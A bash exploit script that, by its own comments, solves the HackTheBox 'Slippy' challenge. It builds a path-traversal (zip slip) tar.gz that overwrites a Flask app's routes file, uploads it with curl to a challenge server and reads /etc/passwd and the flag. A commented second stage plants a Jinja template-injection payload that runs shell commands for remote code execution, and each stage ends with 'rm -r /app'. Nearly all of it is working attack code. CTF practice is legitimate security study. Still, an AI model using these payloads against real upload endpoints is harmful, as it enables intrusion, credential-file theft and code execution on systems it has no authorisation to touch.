#!/bin/bash
# Created this script to solve the HackTheBox challenge called "Slippy".  zipslip atttack

# Create directory and file content (run as root):
mkdir -p /app/application/blueprints
echo -n "from flask import Blueprint, request, render_template, abort
from application.util import extract_from_archive

web = Blueprint('web', __name__)
api = Blueprint('api', __name__)

@web.route('/')
def index():
    return render_template('index.html')

@web.route('/passwd')
def hosts():
    return open('/etc/passwd').read()

@web.route('/flag')
def flag():
    return open('/app/flag').read()

@api.route('/unslippy', methods=['POST'])
def cache():
    if 'file' not in request.files:
        return abort(400)
    
    extraction = extract_from_archive(request.files['file'])
    if extraction:
        return {"list": extraction}, 200

    return '', 204" > ../../../../../../app/application/blueprints/routes.py


# Create malicious .tar.gz file
tar -czvf test.tar.gz -P ../../../../../../../../../../app/application/blueprints/routes.py

# Upload malicious .tar.gz file
curl -s -F "file=@/home/kali/Downloads/test.tar.gz" 'http://188.166.175.58:31397/api/unslippy' --proxy 'http://127.0.0.1:8080' 

# Read /etc/passwd and the flag
curl -i -s 'http://188.166.175.58:31397/passwd'
curl -i -s 'http://188.166.175.58:31397/flag'

# Cleanup
rm -r /app
rm /home/kali/Downloads/test.tar.gz 


# To further this attack to SSTI to get RCE use the script below:
:<<'Comment'
# Create directory and file content (run as root):
mkdir -p /app/application/templates/
echo -n "{{''.__class__.__mro__[1].__subclasses__()[223]('cat flag',shell=True,stdout=-1).communicate()}}" > ../../../../../../app/application/templates/index.html

# Create malicious .tar.gz file
tar -czvf test.tar.gz -P ../../../../../../../../../../app/application/templates/index.html >/dev/null

# Upload malicious .tar.gz file
curl -s -F "file=@/home/kali/Downloads/test.tar.gz" 'http://159.65.24.125:31289/api/unslippy' --proxy 'http://127.0.0.1:8080'  >/dev/null

# Read output of rce performed
curl -s http://159.65.24.125:31289/

# Cleanup
rm -r /app
rm /home/kali/Downloads/test.tar.gz 

Comment
